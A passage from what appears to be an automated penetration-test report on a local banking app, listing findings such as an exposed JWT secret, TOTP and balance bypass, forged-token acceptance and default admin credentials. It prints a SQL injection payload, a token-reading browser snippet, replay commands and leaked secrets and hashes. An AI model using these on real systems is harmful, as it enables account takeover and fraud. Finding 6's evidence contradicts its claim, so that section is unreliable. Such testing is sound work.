20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20represented%20by%20admin_fresh%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20DevTools%20Network%20panel.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Admin%20API%20reflects%20untrusted%20origins%20with%20credentialed%20CORS%22%2C%22description%22%3A%22The%20admin%20customers%20endpoint%20at%20%60%2Fapi%2Fadmin%2Fcustomers%2F2%60%20reflects%20an%20untrusted%20%60Origin%60%20value%20and%20allows%20credentials%20in%20its%20CORS%20response.%20The%20response%20included%20customer%20and%20account%20details.%22%2C%22impact%22%3A%22A%20malicious%20origin%20could%20read%20sensitive%20API%20responses%20if%20a%20victim%20has%20a%20browser%20session%20that%20sends%20credentials%20to%20this%20endpoint.%20The%20frontend%20uses%20bearer%20tokens%20in%20localStorage%2C%20and%20cross-origin%20browser%20access%20to%20authenticated%20data%20was%20not%20demonstrated.%22%2C%22likelihood%22%3A%22The%20server%20returned%20the%20reflected%20origin%20and%20allowed%20credentials%20for%20a%20request%20made%20with%20an%20authenticated%20admin%20session.%20Exploitation%20from%20a%20victim's%20browser%20was%20not%20confirmed%20in%20the%20observed%20setup.%22%2C%22recommendation%22%3A%22Allow%20only%20explicitly%20trusted%20origins%2C%20omit%20credential%20support%20if%20it%20is%20not%20needed%2C%20and%20reject%20unrecognized%20origins.%20Keep%20authentication%20and%20authorization%20checks%20independent%20of%20CORS.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%2F2%22%2C%22evidence%22%3A%22A%20GET%20request%20to%20%60%2Fapi%2Fadmin%2Fcustomers%2F2%60%20with%20%60Origin%3A%20https%3A%2F%2Fevil.example%60%20returned%20HTTP%20200%20with%20%60Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%60%20and%20%60Access-Control-Allow-Credentials%3A%20true%60.%20The%20response%20exposed%20a%20customer%20record%20and%20account%20details.%22%2C%22request_evidence%22%3A%22The%20request%20used%20the%20authenticated%20admin%20session%20and%20an%20untrusted%20Origin%20header.%22%2C%22response_evidence%22%3A%22The%20response%20exposed%20a%20customer%20record%20and%20account%20details%20while%20reflecting%20the%20attacker-controlled%20origin%20and%20allowing%20credentials.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20endpoint%20does%20reflect%20https%3A%2F%2Fevil.example%20and%20sets%20Access-Control-Allow-Credentials%2C%20but%20the%20customer%20response%20is%20available%20only%20when%20an%20explicit%20Authorization%20header%20is%20supplied.%20The%20anonymous%20request%20with%20the%20same%20Origin%20returned%20401%20with%20%E2%80%9CMissing%20or%20invalid%20Authorization%20header%2C%E2%80%9D%20while%20the%20successful%20admin%20request%20evidence%20shows%20Authorization%20present%20and%20Cookies%3A%20none.%20That%20is%20a%20concrete%20benign%20explanation%20for%20the%20claimed%20cross-origin%20data%20exposure%3A%20a%20hostile%20webpage%20does%20not%20receive%20or%20automatically%20send%20the%20API's%20bearer%20token%2C%20so%20the%20reflected%20CORS%20headers%20do%20not%20let%20it%20read%20this%20record%20by%20themselves.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20software%20versions%20disclosed%22%2C%22description%22%3A%22Response%20headers%20disclose%20Apache%20%602.4.68%60%20and%20PHP%20%608.4.25%60%20versions.%22%2C%22impact%22%3A%22The%20version%20details%20give%20attackers%20information%20that%20may%20help%20them%20select%20targeted%20checks%3B%20no%20vulnerable%20component%20or%20exploit%20was%20demonstrated.%22%2C%22likelihood%22%3A%22The%20versions%20are%20directly%20visible%20to%20any%20client%20receiving%20the%20response.%22%2C%22recommendation%22%3A%22Remove%20or%20normalize%20the%20%60Server%60%20and%20%60X-Powered-By%60%20headers%2C%20and%20keep%20the%20server%20components%20patched.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%22%2C%22evidence%22%3A%22The%20response%20headers%20disclose%20%60server%3A%20Apache%2F2.4.68%20(Unix)%60%20and%20%60x-powered-by%3A%20PHP%2F8.4.25%60.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22username%5C%22%3A%20%5C%22'%20OR%20'1'%3D'1'%20--%20%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22not-a-password%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A58%3A57%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2098%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INVALID_CREDENTIALS%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20username%20or%20password.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22username%5C%22%3A%20%5C%22'%20OR%20'1'%3D'1'%20--%20%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22not-a-password%5C%22%7D%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A58%3A57%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2098%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22INVALID_CREDENTIALS%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20username%20or%20password.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20software%20versions%20disclosed%22%2C%22description%22%3A%22The%20registration%20response%20identifies%20Apache%2F2.4.68%20and%20PHP%2F8.4.25%20in%20its%20Server%20and%20X-Powered-By%20headers.%22%2C%22impact%22%3A%22This%20gives%20attackers%20version%20details%20for%20reconnaissance%3B%20the%20probe%20does%20not%20show%20an%20exploitable%20version-specific%20weakness.%22%2C%22likelihood%22%3A%22Anyone%20who%20can%20reach%20the%20registration%20endpoint%20can%20read%20these%20headers.%22%2C%22recommendation%22%3A%22Suppress%20or%20normalize%20the%20Server%20header%20and%20remove%20X-Powered-By.%20Keep%20the%20server%20and%20runtime%20patched.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22The%20registration%20response%20headers%20disclose%20%60server%3A%20Apache%2F2.4.68%20(Unix)%60%20and%20%60x-powered-by%3A%20PHP%2F8.4.25%60.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22first_name%5C%22%3A%20%5C%22Otp%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Test%5C%22%2C%20%5C%22email%5C%22%3A%20%5C%22aespa.otp.923%40example.test%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22SafeTestPass123!%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20201%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A22%3A58%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20588%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22user%5C%22%3A%7B%5C%22id%5C%22%3A25%2C%5C%22email%5C%22%3A%5C%22aespa.otp.923%40example.test%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Otp%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Test%5C%22%2C%5C%22address_line1%5C%22%3Anull%2C%5C%22address_line2%5C%22%3Anull%2C%5C%22suburb%5C%22%3Anull%2C%5C%22state%5C%22%3Anull%2C%5C%22postcode%5C%22%3Anull%2C%5C%22phone%5C%22%3Anull%2C%5C%22avatar_url%5C%22%3Anull%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22password_hash%5C%22%3A%5C%226dffd4f2d5c66e40469390aa5e5fbb71%5C%22%2C%5C%22totp_secret%5C%22%3Anull%7D%2C%5C%22token%5C%22%3A%5C%22%5BREDACTED_JWT%5D%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22Registration%20successful%5C%22%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22first_name%5C%22%3A%20%5C%22Otp%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Test%5C%22%2C%20%5C%22email%5C%22%3A%20%5C%22aespa.otp.923%40example.test%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22SafeTestPass123!%5C%22%7D%22%2C%22response_evidence%22%3A%22Status%3A%20201%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A22%3A58%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20588%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22user%5C%22%3A%7B%5C%22id%5C%22%3A25%2C%5C%22email%5C%22%3A%5C%22aespa.otp.923%40example.test%5C%22%2C%5C%22first_name%5C%22%3A%5C%22Otp%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Test%5C%22%2C%5C%22address_line1%5C%22%3Anull%2C%5C%22address_line2%5C%22%3Anull%2C%5C%22suburb%5C%22%3Anull%2C%5C%22state%5C%22%3Anull%2C%5C%22postcode%5C%22%3Anull%2C%5C%22phone%5C%22%3Anull%2C%5C%22avatar_url%5C%22%3Anull%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22password_hash%5C%22%3A%5C%226dffd4f2d5c66e40469390aa5e5fbb71%5C%22%2C%5C%22totp_secret%5C%22%3Anull%7D%2C%5C%22token%5C%22%3A%5C%22%5BREDACTED_JWT%5D%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22Registration%20successful%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%5D
-->

## 1. Public health endpoint exposes the JWT secret

- Finding reference: RIAG-022
- Severity: critical
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/health
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
The unauthenticated /api/health response discloses the JWT secret, database host, database name, and database username.

### Impact
An attacker can obtain the signing secret and may be able to forge bearer tokens if the application uses it to validate them. The response also reveals database connection details.

### Likelihood
The endpoint returned the secret directly to a request with no Authorization header or cookies. Token forgery was not tested.

### Recommendation
Remove secrets and database credentials from health responses. Rotate the exposed JWT secret, invalidate tokens signed with it, and keep replacement secrets in protected configuration.

### Evidence
```
An unauthenticated GET returned 200 with "jwt_secret":"bankofed-dev-secret-change-in-production", along with db_host, db_name, and db_user.

REQUEST:
GET http://localhost:8081/api/health
use_session: anonymous  Authorization: none
Cookies: none
{}

RESPONSE:
Status: 200
date: Tue, 22 Sep 2026 23:18:47 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 253
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"status":"ok","php_version":"8.4.25","server":"Apache\/2.4.68 (Unix)","db_host":"127.0.0.1","db_name":"bankofed","db_user":"root","jwt_secret":"bankofed-dev-secret-change-in-production","environment":"production"},"message":"OK"}
```

### Request Evidence
```
GET http://localhost:8081/api/health
use_session: anonymous  Authorization: none
Cookies: none
{}
```

### Response Evidence
```
Status: 200
date: Tue, 22 Sep 2026 23:18:47 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 253
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"status":"ok","php_version":"8.4.25","server":"Apache\/2.4.68 (Unix)","db_host":"127.0.0.1","db_name":"bankofed","db_user":"root","jwt_secret":"bankofed-dev-secret-change-in-production","environment":"production"},"message":"OK"}
```

### Validation Note
I repeated the exact unauthenticated GET and received the same live JSON disclosure, including `jwt_secret`, `db_host`, `db_name`, and `db_user`; the response also labels the environment as `production`. The string's `dev` wording could suggest a placeholder, but there is no evidence that the endpoint returns a harmless example instead of configured values, so that does not explain away the exposed configuration.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/health
```

## 2. External transfer action bypasses TOTP and balance checks

- Finding reference: RIAG-008
- Severity: high
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The external transfer action endpoint accepts a manual transfer without the TOTP code required by its preflight check. It marks the transfer completed even though the source account has no available funds.

### Impact
A caller can create completed transfers without passing the advertised TOTP step or having funds in the source account. The evidence confirms the transfer was marked completed, but does not confirm that the recipient received funds.

### Likelihood
The behavior was reproduced with a disposable account and a $1 transfer request.

### Recommendation
Enforce required TOTP verification and available-funds checks in the transfer action endpoint. Reject unverified or unfunded requests, and debit the source balance atomically before marking a transfer completed.

### Evidence
```
A manual $1 preflight for account 101 returned `requires_totp: true`. A subsequent POST to the action endpoint with the same transfer details and no `totp_code` returned HTTP 201 and `status: completed`, with `totp_verified: false` and `new_from_balance: "0.00"`.
```

### Request Evidence
```
Preflight: `{transfer_type:"manual",from_account_id:101,amount:1,to_bsb:"062-001",to_account_number:"12345678"}`. Action used the same values plus a description and omitted `totp_code`.
```

### Response Evidence
```
Preflight returned `requires_totp:true`. Action returned HTTP 201 with a completed transaction, `totp_verified:false`, and an unchanged zero balance.
```

### Validation Note
I replayed the account-101 manual $1 transfer using the matching `logic_user` session and the dummy recipient already present in the account history. With no `totp_code`, the action returned HTTP 201, `status: completed`, `totp_verified: false`, and changed the zero balance to -1.00. The balance result differs from the scanner's report of 0.00, but the live replay still shows the endpoint completing a transfer without TOTP or sufficient funds; I found no account data indicating an overdraft allowance, and the supplied preflight evidence says TOTP is required.

## 3. New customers can set a $1 million credit limit

- Finding reference: RIAG-016
- Severity: high
- OWASP: A04
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The account creation endpoint accepts a customer-supplied credit limit for a credit-card account and issues the account with that same amount. A newly registered test customer created an account with a $1,000,000 limit, without an eligibility check or approval step.

### Impact
A registered user could obtain an unauthorized credit line of their choosing. If the balance can be spent or transferred, this could expose the service to substantial financial loss.

### Likelihood
High. A newly registered test customer received a $1,000,000 limit immediately through the account creation API.

### Recommendation
Enforce a server-side maximum credit limit and apply eligibility and approval rules before issuing a card. Treat the requested limit as untrusted input, return the approved limit separately, and enforce it on every spending action.

### Evidence
```
A POST to `/api/accounts` as a new customer requested a credit-card account with `credit_limit:1000000` and returned HTTP 201. The response created account ID 104 with both `balance` and `credit_limit` set to `1000000.00`. The test account made no spending transactions.
```

### Request Evidence
```
The test account requested a $1,000,000 credit limit and made no spending transactions.
```

### Response Evidence
```
The API created account ID 104 and returned a $1,000,000 credit limit and matching balance.
```

### Validation Note
The first request was rejected only because account_name was missing. Adding that required field and using the authenticated logic_user session returned 201 and created a credit_card account with both balance and credit_limit set to 1000000.00. The usual API documentation routes returned 404, so I found no documented explanation for customers setting their own limit; the separate Amelia session had no Authorization header and could not test the behavior.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"account_name":"Validation Review Card","account_type":"credit_card","credit_limit":1000000}' http://localhost:8081/api/accounts -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **logic_user** or an equivalent user).

Log in as the logic_user account and copy its bearer token from the Authorization header in the DevTools Network panel.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 4. Profile API accepts JWTs with invalid signatures

- Finding reference: RIAG-018
- Severity: high
- OWASP: A07:2021 Identification and Authentication Failures
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/profile
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description
GET /api/profile accepts a bearer JWT with an altered HS256 signature and uses its subject claim to return profile data for user ID 2.

### Impact
An unauthenticated caller can access user 2's profile, including the stored password hash.

### Likelihood
High. The request without credentials returned 401, while the same request with a one-character change to the JWT signature returned 200.

### Recommendation
Verify JWT signatures with the configured server-side key and reject tokens with invalid signatures before using their claims. Do not include password hashes in profile responses.

### Evidence
```
A GET without an Authorization header or cookies returned HTTP 401. A JWT with header alg HS256 and subject 2 returned user 2's profile after one character in its signature was changed. The HTTP 200 response included the profile's password_hash.
```

### Request Evidence
```
Control: GET http://localhost:8081/api/profile with Authorization: none and Cookies: none. Test: same anonymous request with Authorization: Bearer [REDACTED_JWT] (one signature character changed from the recorded ...CkC8 token).
```

### Response Evidence
```
Control returned HTTP 401 with `"message":"Missing or invalid Authorization header."` The modified-signature request returned HTTP 200 and `{"success":true,"data":{"id":2,"email":"wei.zhang@example.com",...,"password_hash":"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi"...}}`.
```

### Validation Note
The exact listed `invalid_sig_user2` bearer session returns HTTP 200 with user 2's profile, including `password_hash`, while a request with no Authorization header returns 401. The ordinary listed sessions did not provide a benign explanation: they were rejected as invalid or expired, while the specifically named invalid-signature session was accepted and returned `wei.zhang@example.com`.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/profile -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **invalid_sig_user2** or an equivalent user).

Use the supplied user-ID-2 test JWT with one character changed in its signature segment. Capture the bearer token from the Authorization header in the browser Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 5. Unauthenticated health endpoint exposes JWT signing secret

- Finding reference: RIAG-011
- Severity: high
- OWASP: A02
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/health
- CVSS: 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
An unauthenticated GET to /api/health returns the HS256 JWT signing secret. A token signed with that value was accepted by the protected /api/profile endpoint.

### Impact
An attacker who can reach the health endpoint can forge accepted JWTs and impersonate accounts. The test confirmed access to a user's private profile.

### Likelihood
High. The endpoint exposes the signing secret without authentication, and a token signed with it was accepted. The same profile request without a token returned HTTP 401.

### Recommendation
Remove signing secrets and database credentials from health responses. Rotate the JWT signing key and invalidate tokens signed with it. Load a high-entropy key from protected runtime configuration, and limit health output to non-sensitive status checks.

### Evidence
```
Anonymous GET /api/health returned the JWT secret "bankofed-dev-secret-change-in-production". A controlled HS256 token signed with that secret, including user_id=1 and role=user, received HTTP 200 from GET /api/profile and returned profile data for Amelia Chen. The same profile request without a token returned HTTP 401.
```

### Request Evidence
```
GET http://localhost:8081/api/health with Authorization: none and Cookies: none. Separately, GET http://localhost:8081/api/profile with Authorization: Bearer <controlled HS256 token signed with the exposed secret>.
```

### Response Evidence
```
The anonymous health response contains "jwt_secret":"bankofed-dev-secret-change-in-production". The signed-token profile request returned HTTP 200; the anonymous profile baseline returned HTTP 401 with "Missing or invalid Authorization header."
```

### Validation Note
An anonymous GET to /api/health returned the JWT secret in the live JSON response. I signed a token with that value and the reported user_id=1 and role=user claims, adding the jti required by the middleware; GET /api/profile then returned HTTP 200 with Amelia Chen's profile. That rules out the benign explanation that the exposed value is only a stale or unused example secret.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/health
```

## 6. Weak admin credentials accepted

- Finding reference: RIAG-019
- Severity: high
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
The admin login accepted username `admin` and password `admin123` and returned an admin JWT. The resulting session could read another customer's personal and account data.

### Impact
Anyone who obtains or guesses these credentials could access sensitive customer records and use admin functions.

### Likelihood
Likely if the admin login is reachable, because the observed password is easy to guess.

### Recommendation
Replace weak or shared admin credentials with unique strong passwords, require MFA for admin accounts, and avoid shipping usable default credentials.

### Evidence
```
POST with `{"username":"admin","password":"admin123"}` returned 200 and an admin JWT. A subsequent request using that session returned another customer's profile and account balances.

REQUEST:
POST http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: none
Cookies: none
{}
{"username": "' OR '1'='1' -- ", "password": "not-a-password"}

RESPONSE:
Status: 401
date: Tue, 22 Sep 2026 23:58:57 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 98
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INVALID_CREDENTIALS","message":"Invalid username or password."}}
```

### Request Evidence
```
POST http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: none
Cookies: none
{}
{"username": "' OR '1'='1' -- ", "password": "not-a-password"}
```

### Response Evidence
```
Status: 401
date: Tue, 22 Sep 2026 23:58:57 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 98
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INVALID_CREDENTIALS","message":"Invalid username or password."}}
```

### Validation Note
The exact anonymous login request with username `admin` and password `admin123` returned 200 and issued an admin JWT. I saved a fresh token from those same credentials, then used it on `GET /api/admin/customers`; it returned records for multiple customers, including names and email addresses. This confirms the credentials grant real admin access, so there is no benign explanation for the reported login.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"username":"admin","password":"admin123"}' http://localhost:8081/api/admin/auth/login
```

## 7. Admin login does not throttle repeated failures

- Finding reference: RIAG-010
- Severity: medium
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The admin login endpoint accepted six consecutive incorrect-password attempts for the known `admin` account without showing a lockout, CAPTCHA, rate-limit response, or increase in response time.

### Impact
An attacker could automate password guessing against the privileged admin account. If successful, account compromise could expose customer records and allow balance or account administration.

### Likelihood
The observed six-attempt sequence completed without a visible throttle. This confirms the behavior for the tested sequence but does not establish the endpoint's behavior beyond those attempts.

### Recommendation
Apply per-account and per-source rate limits to the admin login endpoint, with increasing delays and temporary lockout or step-up verification after repeated failures. Monitor repeated failures and keep login error responses generic.

### Evidence
```
